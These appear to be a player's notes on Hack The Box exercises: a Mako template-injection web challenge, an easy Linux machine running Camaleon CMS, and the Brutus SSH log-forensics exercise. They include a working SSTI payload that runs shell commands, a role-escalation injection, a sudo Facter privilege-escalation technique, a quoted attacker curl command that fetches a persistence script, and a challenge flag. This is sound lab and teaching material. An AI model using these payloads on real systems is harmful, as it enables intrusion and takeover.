# HTB Investigation Notes - June 2026

## 1. Web Challenge: Spookifier
**Type:** Server-Side Template Injection (SSTI)
**Target Engine:** Mako (Python)

### Vulnerability Summary
The application takes user input for a "spookified" font conversion. While most fonts map characters to unicode symbols, **Font 4** passes ASCII characters through as literals. The converted output is then formatted into a string and passed directly into a Mako `Template()` constructor.

### Exploitation
- **Bypass:** Use the `font4` result field to inject Mako `${}` expressions.
- **Payload:** `${self.module.cache.util.os.popen('cat /flag.txt').read()}`
- **Flag:** `HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}`

---

## 2. Machine: Facts (Linux / Easy)
**Initial Foothold:** Camaleon CMS 2.9.0

### Vulnerabilities
1. **CVE-2025-2304 (Mass Assignment):**
   - Vulnerable endpoint: `updated_ajax` in `UsersController`.
   - Exploit: Intercept profile/password update and inject `user[role]=admin`.
2. **Registration Captcha:** 
   - Known static code: `M530H`.
   - Hostname resolution (`facts.htb`) is required for the captcha to load correctly.
3. **S3 Credential Leak:** 
   - Admin panel contains MinIO/AWS credentials.
4. **Privilege Escalation (Root):**
   - Abuse `sudo` on **Facter** using the `--custom-dir` flag to load a malicious Ruby script.

---

## 3. Sherlock: Brutus (Log Analysis)
**Artifacts:** `auth.log`, `wtmp`

### Incident Timeline (UTC)
- **06:31:31:** SSH Brute force begins from **65.2.161.68**.
- **06:31:40:** Attacker successfully authenticates as **root** (Session 34).
- **06:32:44:** Attacker establishes stable terminal session (Session 37 - `pts/1`).
- **06:34:18:** Attacker creates backdoor user **`cyberjunkie`**.
- **06:35:15:** Attacker adds `cyberjunkie` to the `sudo` group.
- **06:37:24:** Attacker disconnects from the `root` session.
- **06:37:34:** Attacker logs in as `cyberjunkie`.
- **06:37:57:** Attacker reads `/etc/shadow` using `sudo`.
- **06:39:38:** Attacker downloads **linper.sh** persistence script via `curl`.

### Key Forensic Data
- **Attacker IP:** `65.2.161.68`
- **Backdoor User:** `cyberjunkie`
- **Sudo Command:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
- **MITRE ATT&CK:** `T1136.001` (Create Account: Local Account)
